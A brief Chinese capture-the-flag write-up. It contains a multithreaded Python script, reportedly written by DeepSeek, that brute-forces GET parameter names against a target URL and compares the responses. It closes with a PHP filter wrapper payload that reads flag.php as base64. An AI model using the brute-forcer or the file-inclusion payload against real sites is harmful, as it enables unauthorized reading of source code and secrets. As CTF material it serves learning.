# 第十一章

AI太好用了（

自己写了一个单线程脚本，但是耗时太久了。等我爆破出来某个参数时正确的参数已经变成另一个了。于是叫deepseek写了个多线程爆破脚本
```py
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor
import argparse
import threading
from difflib import SequenceMatcher
import concurrent.futures

# 全局变量存储成功结果（使用线程锁保护）
success_results = []
success_lock = threading.Lock()

# 存储第一个失败响应作为比对基准
baseline_response = None
baseline_lock = threading.Lock()

def get_response_similarity(resp1, resp2):
    """计算两个响应的相似度"""
    return SequenceMatcher(None, resp1.text, resp2.text).ratio()

def test_parameter(url, param_name, param_value):
    """
    测试单个参数组合，与基准响应比对
    """
    global baseline_response
    
    try:
        params = {param_name: param_value}
        response = requests.get(url, params=params, timeout=10)
        
        # 获取或设置基准响应（第一个失败响应）
        with baseline_lock:
            if baseline_response is None and response.status_code == 200:
                baseline_response = response
        
        # 如果有基准响应，则比对
        if baseline_response is not None:
            similarity = get_response_similarity(baseline_response, response)
            
            # 如果相似度低于阈值，认为是不同的响应
            if similarity < 0.9:  # 阈值可根据实际情况调整
                with success_lock:
                    success_results.append((param_name, param_value, response.url))
                
                print(f"\n[+] Found potential parameter: {param_name}={param_value}")
                print(f"    URL: {response.url}")
                print(f"    Similarity with baseline: {similarity:.2f}")
                return True
    
    except Exception as e:
        print(f"[-] Error testing {param_name}={param_value}: {str(e)}")
    return False

def generate_parameter_combinations():
    """
    生成所有可能的参数名组合（m,n,o,p,q的排列）
    参数名和参数值相同，长度为5
    """
    letters = ['m', 'n', 'o', 'p', 'q']
    # 生成所有5个字母的排列组合
    for perm in itertools.permutations(letters, 5):
        param_name = ''.join(perm)
        yield (param_name, param_name)

def brute_force(url, max_threads=10):
    """
    执行爆破
    """
    print(f"[*] Starting brute force on {url}")
    print(f"[*] Testing all 120 possible parameter combinations...")
    print(f"[*] Using {max_threads} threads")
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # 提交所有任务
        futures = [executor.submit(test_parameter, url, pname, pvalue) 
                  for pname, pvalue in generate_parameter_combinations()]
        
        # 显示进度
        completed = 0
        total = 120  # 5! = 120种组合
        for future in concurrent.futures.as_completed(futures):
            completed += 1
            print(f"\rProgress: {completed}/{total} ({completed/total:.1%})", end="", flush=True)
            future.result()  # 获取结果（如有异常会在这里抛出）
    
    print("\n\n[+] Brute force completed!")
    if success_results:
        print("[+] Successful parameters found:")
        for i, (pname, pvalue, url) in enumerate(success_results, 1):
            print(f"  {i}. {pname}={pvalue} - {url}")
    else:
        print("[-] No valid parameters found")

def main():
    parser = argparse.ArgumentParser(description="GET Parameter Brute Forcer with Response Comparison")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--threads", type=int, default=10, 
                       help="Number of threads (default: 10)")
    parser.add_argument("-s", "--similarity", type=float, default=0.9,
                       help="Similarity threshold to identify different responses (default: 0.9)")
    
    args = parser.parse_args()
    
    brute_force(args.url, args.threads)

if __name__ == "__main__":
    main()
```
最后是一个php伪协议：`php://filter/read=convert.base64-encode/resource=./flag.php`